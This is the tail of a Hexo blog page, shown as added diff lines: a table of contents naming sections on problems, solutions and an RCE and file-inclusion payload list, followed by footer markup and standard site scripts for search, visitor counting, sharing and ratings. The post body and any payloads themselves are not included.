+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#简介"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#架构"><span class="nav-number">2.</span> <span class="nav-text">架构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#抛出问题"><span class="nav-number">3.</span> <span class="nav-text">抛出问题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#问题一"><span class="nav-number">3.1.</span> <span class="nav-text">问题一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#问题二"><span class="nav-number">3.2.</span> <span class="nav-text">问题二</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#问题三"><span class="nav-number">3.3.</span> <span class="nav-text">问题三</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#解决问题"><span class="nav-number">4.</span> <span class="nav-text">解决问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#payload大全"><span class="nav-number">5.</span> <span class="nav-text">payload大全</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#rce"><span class="nav-number">5.1.</span> <span class="nav-text">rce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件包含"><span class="nav-number">5.2.</span> <span class="nav-text">文件包含</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">bey0ndm3</span>
+
+  
+</div>
+
+<p>My way of tramp journey is from the galaxy's firmament to the starry ocean.</p>    <!--文字-->
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+      <div id="needsharebutton-float">
+        <span class="btn">
+          <i class="fa fa-share-alt" aria-hidden="true"></i>
+        </span>
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("3zIUNafVjzYQz7AJMe457cT0-gzGzoHsz", "PzPKmCfoYOpSgHcoyql6etIG");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+  
+  <link rel="stylesheet" href="/lib/needsharebutton/needsharebutton.css">
+
+  
+  
+  <script src="/lib/needsharebutton/needsharebutton.js"></script>
+
+  <script>
+    
+      pbOptions = {};
+      
+          pbOptions.iconStyle = "box";
+      
+          pbOptions.boxForm = "horizontal";
+      
+          pbOptions.position = "bottomCenter";
+      
+          pbOptions.networks = "Weibo,Wechat,Douban,QQZone,Twitter,Facebook";
+      
+      new needShareButton('#needsharebutton-postbottom', pbOptions);
+    
+    
+      flOptions = {};
+      
+          flOptions.iconStyle = "box";
+      
+          flOptions.boxForm = "horizontal";
+      
+          flOptions.position = "middleRight";
+      
+          flOptions.networks = "Weibo,Wechat,Douban,QQZone,Twitter,Facebook";
+      
+      new needShareButton('#needsharebutton-float', flOptions);
+    
+  </script>
+
+  
+  <script type="text/javascript">
+  wpac_init = window.wpac_init || [];
+  wpac_init.push({widget: 'Rating', id: 12981,
+    el: 'wpac-rating',
+    color: 'fc6423'
+  });
+  (function() {
+    if ('WIDGETPACK_LOADED' in window) return;
+    WIDGETPACK_LOADED = true;
+    var mc = document.createElement('script');
+    mc.type = 'text/javascript';
+    mc.async = true;
+    mc.src = '//embed.widgetpack.com/widget.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(mc, s.nextSibling);
+  })();
+  </script>
+
+
+  
+  
+
+
+  
+
+  
+  <script type="text/javascript" src="/js/src/exturl.js?v=5.1.4"></script>
+
+
+</body>
+</html>
